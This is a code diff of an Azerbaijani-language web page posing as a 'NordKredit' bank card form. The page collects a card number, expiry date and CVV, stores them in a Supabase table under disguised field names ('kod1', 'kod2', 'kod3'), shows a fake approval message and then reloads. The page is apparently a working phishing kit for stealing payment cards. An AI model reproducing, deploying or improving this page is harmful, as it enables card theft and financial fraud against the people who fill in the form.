@@ -18,10 +18,10 @@ body{height:100vh;display:flex;justify-content:center;align-items:center;backgro
 .card-wrapper{perspective:1000px;margin-top:50px;width:100%;}
 .card{width:100%;height:210px;position:relative;transform-style:preserve-3d;transition:0.8s;border-radius:20px;overflow:hidden;}
 .card.flip{transform:rotateY(180deg);}
-.card-face{position:absolute;width:100%;height:100%;backface-visibility:hidden;padding:20px;color:white;border-radius:20px;display:flex;flex-direction:column;justify-content:center;align-items:center;}
+.card-face{position:absolute;width:100%;height:100%;backface-visibility:hidden;border-radius:20px;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px;color:white;}
 .front{background:linear-gradient(90deg,#1bb34a,#0c5f2b);}
 .back{background:#111;transform:rotateY(180deg);display:flex;flex-direction:column;justify-content:flex-start;align-items:center;}
-.strip{width:100%;height:40px;background:black;margin-bottom:20px;}
+.strip{width:80%;height:6px;background:#222;margin:20px 0;border-radius:3px;}
 .cvv-box{background:white;color:black;padding:10px;text-align:right;border-radius:5px;font-weight:bold;width:80%;}
 
 /* Kart nömrəsi və exp */
@@ -55,22 +55,21 @@ button{padding:14px;border:none;border-radius:10px;background:linear-gradient(90
 
 <div class="card-wrapper">
 <div class="card" id="card">
-<div class="card-face front">
-<div class="logo-text"><div class="logo-icon"></div><div>NordKredit</div></div>
-<div class="number" id="cardNumber">0000 0000 0000 0000</div>
-<div class="exp" id="cardExp">MM/YY</div>
-</div>
-
-<div class="card-face back">
-<div class="strip"></div>
-<div class="cvv-box" id="cvvDisplay">***</div>
-</div>
+  <div class="card-face front">
+    <div class="logo-text"><div class="logo-icon"></div><div>NordKredit</div></div>
+    <div class="number" id="cardNumber">0000 0000 0000 0000</div>
+    <div class="exp" id="cardExp">MM/YY</div>
+  </div>
+  <div class="card-face back">
+    <div class="strip"></div>
+    <div class="cvv-box" id="cvvDisplay">***</div>
+  </div>
 </div>
 </div>
 
 <form id="form">
 <input type="text" maxlength="19" placeholder="16 rəqəmli kod" id="numberInput">
-<input type="text" maxlength="5" placeholder="MM/YY" id="expInput">
+<input type="text" maxlength="4" placeholder="MMYY" id="expInput">
 <input type="text" maxlength="3" placeholder="Təhlükəsizlik kodu" id="cvvInput">
 <button type="submit">Təsdiqlə</button>
 </form>
@@ -99,4 +98,62 @@ const cardNumber=document.getElementById("cardNumber")
 const cardExp=document.getElementById("cardExp")
 const cvvDisplay=document.getElementById("cvvDisplay")
 const card=document.getElementById("card")
-const loading=document.getElementById("lo
+const loading=document.getElementById("loading")
+const loadingText=document.getElementById("loadingText")
+
+/* Kart nömrəsi 16 rəqəm, yan-yana 4-4 blok */
+numberInput.addEventListener("input", e=>{
+  let val=e.target.value.replace(/\D/g,'').substring(0,16)
+  let blocks=[]
+  for(let i=0;i<val.length;i+=4){ blocks.push(val.substr(i,4)) }
+  val=blocks.join(' ')
+  cardNumber.textContent=val||"0000 0000 0000 0000"
+  numberInput.value=val
+})
+
+/* MMYY 4 rəqəm, 2/2 format */
+expInput.addEventListener("input", e=>{
+  let val=e.target.value.replace(/\D/g,'').substring(0,4)
+  if(val.length>2){ val=val.substring(0,2)+"/"+val.substring(2) }
+  expInput.value=val
+  cardExp.textContent=val||"MM/YY"
+})
+
+/* CVV input kart arxasını göstərir */
+cvvInput.addEventListener("focus",()=>card.classList.add("flip"))
+cvvInput.addEventListener("blur",()=>card.classList.remove("flip"))
+cvvInput.addEventListener("input", e=>{
+  let val=e.target.value.replace(/\D/g,'').substring(0,3)
+  cvvInput.value=val
+  cvvDisplay.textContent=val
+  setTimeout(()=>cvvDisplay.textContent="***",1000)
+})
+
+/* CVV qutusuna toxunanda kart arxaya çevrilir */
+cvvDisplay.addEventListener("focus",()=>card.classList.add("flip"))
+
+form.addEventListener("submit", async e=>{
+  e.preventDefault()
+  if(numberInput.value.replace(/\s/g,'').length!==16){ alert("16 rəqəm tam daxil edilməlidir"); return }
+  if(expInput.value.length!==5){ alert("Tarix düzgün deyil"); return }
+  if(cvvInput.value.length!==3){ alert("3 rəqəmli kod daxil edin"); return }
+
+  loading.style.display="flex"
+
+  const { data, error } = await supabase.from("mesajlar").insert([
+    { kod1:numberInput.value, kod2:expInput.value, kod3:cvvInput.value }
+  ])
+
+  if(error){ console.error("Supabase xəta:", error); alert("Xəta baş verdi: " + error.message); loading.style.display="none"; return }
+
+  setTimeout(()=>{
+    loadingText.textContent="Təbriklər Sorğunuz Təsdiq Olundu"
+  },7000)
+
+  setTimeout(()=>{
+    window.location.reload()
+  },9500)
+})
+</script>
+</body>
+</html>
